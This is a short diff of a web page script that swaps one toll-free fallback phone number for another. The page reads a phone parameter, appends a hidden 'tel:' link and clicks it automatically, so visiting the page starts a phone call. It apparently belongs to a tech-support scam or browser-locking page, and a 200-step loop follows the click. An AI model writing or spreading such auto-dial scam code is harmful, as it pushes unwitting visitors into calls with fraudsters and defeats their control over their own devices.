@@ -58,7 +58,7 @@ import './text_tel.js';
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-855-670-5148');
+        window.number = (window.number ? window.number : '+1-844-449-0284');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -116,7 +116,7 @@ import './text_tel.js';
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-670-5148"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-449-0284"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
